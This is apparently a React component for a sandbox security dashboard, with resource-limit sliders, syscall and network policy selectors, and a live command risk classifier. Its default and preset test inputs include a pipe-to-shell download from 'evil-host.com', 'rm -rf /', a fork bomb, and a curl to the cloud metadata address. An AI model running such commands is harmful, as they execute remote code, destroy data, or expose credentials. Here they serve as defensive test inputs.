import React, { useState } from 'react';
import { useAegis } from '../context/AegisContext';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Sliders, 
  Lock, 
  Cpu, 
  HardDrive, 
  Clock, 
  Network, 
  AlertTriangle, 
  Ban, 
  CheckCircle2, 
  Sparkles,
  Layers
} from 'lucide-react';

export const AdaptiveSandboxView: React.FC = () => {
  const { sandboxConfig, setSandboxConfig, commandHistory, testCommand } = useAegis();
  const [testCmdInput, setTestCmdInput] = useState<string>('curl -s https://evil-host.com/payload.sh | sh');
  const [latestAnalysis, setLatestAnalysis] = useState(() => testCommand('curl -s https://evil-host.com/payload.sh | sh'));

  const handleTestCommand = (cmdToTest?: string) => {
    const target = cmdToTest || testCmdInput;
    const res = testCommand(target);
    setLatestAnalysis(res);
  };

  const sampleCommands = [
    { cmd: 'echo "System ready"', label: 'echo hello (Safe)' },
    { cmd: 'pytest tests/test_rate_limiter.py', label: 'pytest (Safe)' },
    { cmd: 'pip install cryptography==42.0.5', label: 'pip install (Medium)' },
    { cmd: 'curl -s http://169.254.169.254/latest/meta-data/', label: 'curl metadata (High Risk)' },
    { cmd: 'rm -rf /', label: 'rm -rf / (Dangerous - Blocked)' },
    { cmd: ':(){ :|:& };:', label: 'forkbomb (Kernel Exploit - Blocked)' }
  ];

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="bg-[#0C0C0E] border border-[#27272A] p-4">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-3">
          <div>
            <div className="flex items-center gap-2">
              <span className="text-[10px] uppercase font-mono px-2 py-0.5 bg-green-500/10 border border-green-500/40 text-green-400 font-bold">
                03_SECURE_ISOLATION
              </span>
              <h2 className="text-sm font-bold text-white uppercase tracking-tight flex items-center gap-2 font-mono">
                <ShieldAlert className="w-4 h-4 text-green-400" />
                <span>ADAPTIVE SANDBOX & RISK-BASED SECURITY CONTROLLER</span>
              </h2>
            </div>
            <p className="text-xs text-[#71717A] mt-1">
              Multi-tiered security isolation with cgroups v2 resource ceilings, seccomp-bpf syscall filtering, and real-time command risk assessment.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono px-3 py-1.5 bg-[#18181B] border border-[#27272A] text-cyan-400 uppercase tracking-wider">
              ISOLATION: OVERLAYFS + EBPF ACTIVE
            </span>
          </div>
        </div>
      </div>

      {/* Main Grid: Sandbox Controller Configuration & Risk Evaluator */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
        {/* Left 6: Sandbox Resource Ceilings & Policy Knobs */}
        <div className="lg:col-span-6 bg-[#0C0C0E] border border-[#27272A] p-4 space-y-4">
          <div className="flex items-center justify-between border-b border-[#27272A] pb-2">
            <h3 className="text-[10px] font-bold uppercase tracking-widest text-[#71717A] font-mono flex items-center gap-2">
              <Sliders className="w-3.5 h-3.5 text-cyan-400" />
              <span>Sandbox Controller (Cgroups v2 & Isolation)</span>
            </h3>
            <span className="text-[9px] font-mono text-green-400 uppercase tracking-wider bg-green-500/10 px-2 py-0.5 border border-green-500/30">Strict Enforcement</span>
          </div>

          <div className="space-y-4">
            {/* CPU Limit */}
            <div className="space-y-1.5">
              <div className="flex justify-between text-xs font-mono">
                <span className="text-[#E4E4E7] flex items-center gap-1.5 text-[11px]">
                  <Cpu className="w-3.5 h-3.5 text-cyan-400" />
                  CPU Quota Limit:
                </span>
                <span className="text-cyan-400 font-bold">{sandboxConfig.cpuLimitPercent}% Core</span>
              </div>
              <input
                type="range"
                min="10"
                max="100"
                step="5"
                value={sandboxConfig.cpuLimitPercent}
                onChange={(e) => setSandboxConfig(prev => ({ ...prev, cpuLimitPercent: Number(e.target.value) }))}
                className="w-full accent-cyan-400 bg-black cursor-pointer"
              />
            </div>

            {/* RAM Limit */}
            <div className="space-y-1.5">
              <div className="flex justify-between text-xs font-mono">
                <span className="text-[#E4E4E7] flex items-center gap-1.5 text-[11px]">
                  <HardDrive className="w-3.5 h-3.5 text-yellow-500" />
                  RAM Memory Ceiling:
                </span>
                <span className="text-yellow-400 font-bold">{sandboxConfig.ramLimitMb} MB</span>
              </div>
              <input
                type="range"
                min="128"
                max="4096"
                step="128"
                value={sandboxConfig.ramLimitMb}
                onChange={(e) => setSandboxConfig(prev => ({ ...prev, ramLimitMb: Number(e.target.value) }))}
                className="w-full accent-yellow-400 bg-black cursor-pointer"
              />
            </div>

            {/* Execution Timeout */}
            <div className="space-y-1.5">
              <div className="flex justify-between text-xs font-mono">
                <span className="text-[#E4E4E7] flex items-center gap-1.5 text-[11px]">
                  <Clock className="w-3.5 h-3.5 text-orange-400" />
                  Execution Watchdog Timeout:
                </span>
                <span className="text-orange-400 font-bold">{sandboxConfig.timeoutSeconds}s</span>
              </div>
              <input
                type="range"
                min="3"
                max="60"
                step="1"
                value={sandboxConfig.timeoutSeconds}
                onChange={(e) => setSandboxConfig(prev => ({ ...prev, timeoutSeconds: Number(e.target.value) }))}
                className="w-full accent-orange-400 bg-black cursor-pointer"
              />
            </div>

            {/* Syscall Filter & Network Policy Controls */}
            <div className="grid grid-cols-2 gap-3 pt-2">
              <div className="p-2.5 bg-[#18181B] border border-[#27272A] space-y-1">
                <span className="text-[10px] text-[#71717A] block font-mono uppercase tracking-wider">Syscall Profile:</span>
                <select
                  value={sandboxConfig.syscallIsolation}
                  onChange={(e) => setSandboxConfig(prev => ({ ...prev, syscallIsolation: e.target.value as any }))}
                  className="w-full bg-black border border-[#27272A] text-white text-xs p-1.5 font-mono focus:outline-none focus:border-cyan-500"
                >
                  <option value="strict_seccomp">Strict Seccomp-BPF</option>
                  <option value="moderate_bpf">Moderate BPF Trap</option>
                  <option value="permissive">Permissive Audit</option>
                </select>
              </div>

              <div className="p-2.5 bg-[#18181B] border border-[#27272A] space-y-1">
                <span className="text-[10px] text-[#71717A] block font-mono uppercase tracking-wider">Network Policy:</span>
                <select
                  value={sandboxConfig.networkPolicy}
                  onChange={(e) => setSandboxConfig(prev => ({ ...prev, networkPolicy: e.target.value as any }))}
                  className="w-full bg-black border border-[#27272A] text-white text-xs p-1.5 font-mono focus:outline-none focus:border-cyan-500"
                >
                  <option value="deny_all">Deny All Egress</option>
                  <option value="allow_dns_only">DNS Resolution Only</option>
                  <option value="allowlist_strictly">Allowlist Filter</option>
                  <option value="open">Open (Unsafe)</option>
                </select>
              </div>
            </div>

            {/* Isolation Toggles */}
            <div className="space-y-2 pt-2 border-t border-[#27272A] text-xs font-mono">
              <label className="flex items-center justify-between text-[#E4E4E7] cursor-pointer">
                <span className="text-[11px]">Read-Only Base Root Filesystem:</span>
                <input
                  type="checkbox"
                  checked={sandboxConfig.readOnlyBaseFs}
                  onChange={(e) => setSandboxConfig(prev => ({ ...prev, readOnlyBaseFs: e.target.checked }))}
                  className="accent-cyan-400"
                />
              </label>
              <label className="flex items-center justify-between text-[#E4E4E7] cursor-pointer">
                <span className="text-[11px]">Ephemeral Overlay Workspace (Tmpfs):</span>
                <input
                  type="checkbox"
                  checked={sandboxConfig.tmpWorkspaceOverlay}
                  onChange={(e) => setSandboxConfig(prev => ({ ...prev, tmpWorkspaceOverlay: e.target.checked }))}
                  className="accent-cyan-400"
                />
              </label>
              <label className="flex items-center justify-between text-[#E4E4E7] cursor-pointer">
                <span className="text-[11px]">Automatic Process Namespace Cleanup:</span>
                <input
                  type="checkbox"
                  checked={sandboxConfig.autoCleanup}
                  onChange={(e) => setSandboxConfig(prev => ({ ...prev, autoCleanup: e.target.checked }))}
                  className="accent-cyan-400"
                />
              </label>
            </div>
          </div>
        </div>

        {/* Right 6: Risk-Based Execution Controller */}
        <div className="lg:col-span-6 bg-[#0C0C0E] border border-[#27272A] p-4 space-y-4">
          <div className="flex items-center justify-between border-b border-[#27272A] pb-2">
            <h3 className="text-[10px] font-bold uppercase tracking-widest text-[#71717A] font-mono flex items-center gap-2">
              <Terminal className="w-3.5 h-3.5 text-yellow-500" />
              <span>Risk-Based Command Classifier & Policy</span>
            </h3>
            <span className="text-[9px] font-mono text-cyan-400 uppercase tracking-wider">Live Analyzer</span>
          </div>

          {/* Quick preset buttons */}
          <div className="flex flex-wrap gap-1.5">
            {sampleCommands.map((sc, i) => (
              <button
                key={i}
                onClick={() => {
                  setTestCmdInput(sc.cmd);
                  handleTestCommand(sc.cmd);
                }}
                className="px-2 py-1 bg-[#18181B] hover:bg-[#27272A] border border-[#27272A] text-[10px] text-[#E4E4E7] font-mono transition cursor-pointer"
              >
                {sc.label}
              </button>
            ))}
          </div>

          {/* Custom Command Input */}
          <div className="flex gap-2">
            <input
              type="text"
              value={testCmdInput}
              onChange={(e) => setTestCmdInput(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter') handleTestCommand();
              }}
              placeholder="Enter command to evaluate risk (e.g., rm -rf /, curl, pip install)..."
              className="flex-1 bg-black border border-[#27272A] px-3 py-1.5 text-xs font-mono text-[#E4E4E7] focus:outline-none focus:border-cyan-500"
            />
            <button
              onClick={() => handleTestCommand()}
              className="px-4 py-1.5 bg-white text-black hover:bg-cyan-500 font-mono text-[10px] font-bold uppercase tracking-widest transition cursor-pointer"
            >
              Analyze
            </button>
          </div>

          {/* Real-time Classification Result Card */}
          {latestAnalysis && (
            <div className={`p-3.5 border space-y-2.5 font-mono text-xs ${
              latestAnalysis.riskLevel === 'BLOCK'
                ? 'bg-red-500/10 border-red-500 text-white'
                : latestAnalysis.riskLevel === 'HIGH'
                ? 'bg-yellow-500/10 border-yellow-500 text-white'
                : latestAnalysis.riskLevel === 'MEDIUM'
                ? 'bg-cyan-500/10 border-cyan-500 text-white'
                : 'bg-green-500/10 border-green-500 text-white'
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-[#71717A] uppercase">Command Risk Level:</span>
                <span className={`px-2 py-0.5 font-bold uppercase text-[10px] ${
                  latestAnalysis.riskLevel === 'BLOCK'
                    ? 'bg-red-500 text-black'
                    : latestAnalysis.riskLevel === 'HIGH'
                    ? 'bg-yellow-500 text-black'
                    : latestAnalysis.riskLevel === 'MEDIUM'
                    ? 'bg-cyan-500 text-black'
                    : 'bg-green-500 text-black'
                }`}>
                  {latestAnalysis.riskLevel}
                </span>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-[10px] text-[#71717A] uppercase">Automated Action Decision:</span>
                <span className="font-bold text-white uppercase text-[11px]">
                  {latestAnalysis.action}
                </span>
              </div>

              <div className="pt-2 border-t border-[#27272A] text-[11px]">
                <span className="text-[#71717A] block font-bold mb-0.5 text-[9px] uppercase tracking-wider">Policy Rationale:</span>
                <p className="text-[#E4E4E7] leading-relaxed">{latestAnalysis.reason}</p>
              </div>

              <div className="text-[10px]">
                <span className="text-[#71717A] block font-bold mb-1 uppercase tracking-wider text-[9px]">Syscall Risk Vectors:</span>
                <div className="flex flex-wrap gap-1">
                  {latestAnalysis.syscallRiskVector.map((sys, idx) => (
                    <span key={idx} className="px-1.5 py-0.5 bg-black border border-[#27272A] text-[#E4E4E7]">
                      {sys}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Intercepted Command History */}
          <div className="space-y-1.5 pt-2">
            <span className="text-[9px] font-bold text-[#71717A] uppercase font-mono tracking-wider">Recent Intercepts Log:</span>
            <div className="max-h-[140px] overflow-y-auto space-y-1 font-mono text-[11px]">
              {commandHistory.map((item, i) => (
                <div key={i} className="p-1.5 bg-black border border-[#27272A] flex items-center justify-between">
                  <span className="truncate max-w-[280px] text-[#E4E4E7]">{item.command}</span>
                  <span className={`px-1.5 py-0.2 text-[9px] font-bold uppercase font-mono ${
                    item.riskLevel === 'BLOCK' ? 'text-red-400' : item.riskLevel === 'HIGH' ? 'text-yellow-400' : 'text-green-400'
                  }`}>
                    {item.action}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
